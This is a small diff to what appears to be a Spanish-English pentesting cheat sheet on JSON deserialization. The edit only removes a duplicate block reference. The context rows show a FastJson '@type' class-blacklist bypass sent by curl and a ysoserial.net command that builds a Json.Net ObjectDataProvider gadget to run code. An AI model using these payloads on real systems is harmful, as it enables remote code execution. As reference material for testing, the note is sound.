@@ -34,7 +34,6 @@ linked:
 | `curl -X POST -d '{"@type":"L<class>;"}' https://target/api/x` (formato referencia Java) | FastJson reference bypass class blacklist | Blacklist sobre class name. |
 | `ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"` y POST resultado | Generate JSON.NET payload con tool | Newtonsoft TypeNameHandling. |
 ^deser-fmt-json
-^deser-fmt-json
 
 ### JSON.NET vulnerable config
 
